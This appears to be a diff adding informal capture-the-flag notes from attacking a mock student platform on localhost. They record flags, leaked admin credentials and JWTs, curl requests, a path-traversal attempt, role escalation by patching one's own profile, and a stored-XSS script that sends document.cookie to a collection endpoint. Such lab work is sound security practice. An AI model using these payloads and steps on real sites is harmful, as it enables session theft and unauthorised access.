@@ -1,0 +1,125 @@
+ /reset-password link has v1.2.0 — sophie  — initial platform. jwt secret was 42. wil changed it to 42network. progress. comment
+
+might serve a shell onto a download folder, same with xml maybe
+
+jdoe@student.42.tech pw abc123
+
+
+concrete finds:
+1.
+bruteforce rockyou jdoe@student.42.tech pw abc123
+
+2
+unrestricted upload
+FLAG{unr3str1ct3d_upl0ad_g0_brrr}
+
+3. 
+pocketbase data
+admin passwd and others leak with xml upload and point to internal/config
+: {"jwt_secret":"42network","pb_admin_email":"admin@42network.local","pb_admin_password":"Darkly42Admin!","app_version":"1.0.0","campus":"wilcity","darkly_flag":"FLAG{d3fus3dxml_n3xt_spr1nt_pr0m1s3}"}
+
+FLAG in pocketbase recovery code for students
+FLAG{r3s3t_t0k3n_w4s_just_md5_lol}
+
+step7?
+for some reason theres a flag on wils profile
+FLAG{1d0r_ur_pr0f1l3_1s_m1n3}
+
+5.
+/api/docs-internal
+{"collections":{"users":{"writable_fields":["first_name","last_name","campus","avatar","role"],"role_values":["visitor","student","cadet","staff","god"],"note":"role writable via PATCH /api/profile"},"grades":{"fields":["id","student","project","score","flag"],"note":"flag field accessible via GET /api/grades?student={id}"}}}
+
+- reference the picture, FLAG{md5_1s_4_n4m3pl4t3_n0t_4_l0ck}
+
+6
+role writable via PATCH /api/profile"
+reference picture - elevated to cadet
+- now access to staff/dashboard area 
+FLAG{just_p4tch_y0ur_0wn_r0l3_lol}
+
+7 through staff area found link to pocketbase, logged in with 3.
+elevated myself to god
+
+8 internal audit from pocketbase flag
+FLAG{th3_und3rsc0r3_sl4sh_kn0ws_th3_w4y}
+
+
+note: maybe try and change robots.txt to allow backup or smth to be accessed
+
+9?forum post by wil
+Network ops ref for the team: dmFsaWRhdGlvbl9rZXk9NDJuZXR3b3Jr
+
+decodes to validation_key=42network
+
+10 - backup schedule and notes reference picture
+
+
+XSS forum comments: - admin/modbot parses through those, exploit possible
+
+found the backup by creating my own
+
+
+
+data.db params leaks settings and admintokens.
+
+wil confirmed we are supposed to access the CLI at some point.
+JWT http://localhost:8090/api/admins/auth-with-password
+{"admin":{"id":"2f2g9uourq3p0mb","created":"2026-06-06 14:15:05.606Z","updated":"2026-06-06 14:15:05.606Z","avatar":0,"email":"admin@42network.local"},"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODcyMzI5NjYsImlkIjoiMmYyZzl1b3VycTNwMG1iIiwidHlwZSI6ImFkbWluIn0.SHiTayqc0qurwRCEXmPneMxsBx0rVtNtKzb5AsrN1tc"}
+
+
+admin file token 
+c2r13s5% curl -i \
+  -X POST \
+  'http://localhost:8090/api/files/token' \              
+  -H 'Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODcyMzI5NjYsImlkIjoiMmYyZzl1b3VycTNwMG1iIiwidHlwZSI6ImFkbWluIn0.SHiTayqc0qurwRCEXmPneMxsBx0rVtNtKzb5AsrN1tc'
+HTTP/1.1 200 OK
+Content-Type: application/json; charset=UTF-8
+Vary: Origin
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+X-Xss-Protection: 1; mode=block
+Date: Thu, 06 Aug 2026 13:38:07 GMT
+Content-Length: 169
+
+{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODcyMzMwODcsImlkIjoiMmYyZzl1b3VycTNwMG1iIiwidHlwZSI6ImFkbWluIn0.q5aIlVSZeXtACqe6DOmxa91WkLscCGvDzKbsSXE1JUU"}
+
+
+the backup works as long as the original 7 files are present, and no direct path traversal is attempted in an 8th file.
+testable best, by commenting on a forum post, uploading a backup, seeing if the post is still there
+if its still there, the backup got rejected.
+
+
+import collections angle pretty dead, throws errors when trying basic vulnerability sql stuff, which is locked off from the sql version thats used.
+
+s3 only sends testfiles, doesnt upload any real files aside from the backups 
+
+upload - flag							FLAG{unr3str1ct3d_upl0ad_g0_brrr}
+api/patch - flag 						FLAG{just_p4tch_y0ur_0wn_r0l3_lol}
+email reset - flag(through pocketbase) 	FLAG{r3s3t_t0k3n_w4s_just_md5_lol}
+xml - flag and admin creds 				FLAG{d3fus3dxml_n3xt_spr1nt_pr0m1s3}
+pocketbase - flag 						FLAG{th3_und3rsc0r3_sl4sh_kn0ws_th3_w4y}
+forum comments xss - ref txtfile		FLAG{d0t_d0t_sl4sh_4ll_th3_w4y_d0wn}						
+forum /api/collect      flag=FLAG{xss_st0r3d_1s_n0t_4_f34tur3_w1l}
+flag on wils profile?					FLAG{1d0r_ur_pr0f1l3_1s_m1n3}
+api/docs/internal						FLAG{md5_1s_4_n4m3pl4t3_n0t_4_l0ck}
+
+<script>
+fetch(`/api/collect?c=${encodeURIComponent(document.cookie)}`);
+</script>
+
+unsolved hints.
+/.well-known/appspecific/com.chrome.devtools.json
+bots making a constant get requst to this
+
+
+c2r13s5% COOKIE='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODcyMzMwODcsImlkIjoiMmYyZzl1b3VycTNwMG1iIiwidHlwZSI6ImFkbWluIn0.q5aIlVSZeXtACqe6DOmxa91WkLscCGvDzKbsSXE1JUU'
+
+curl -i "http://localhost:4942/../opt/pocketbase/pb_data/i" -b "$COOKIE"
+fukin hell
+
+
+registering a service worker through the bot scanning -> scoped to static/uploads
+syncing s3 with actual files -> not possible without CLI
+.well-known angle seems dead.
+
+still taunting me: 4942/backup
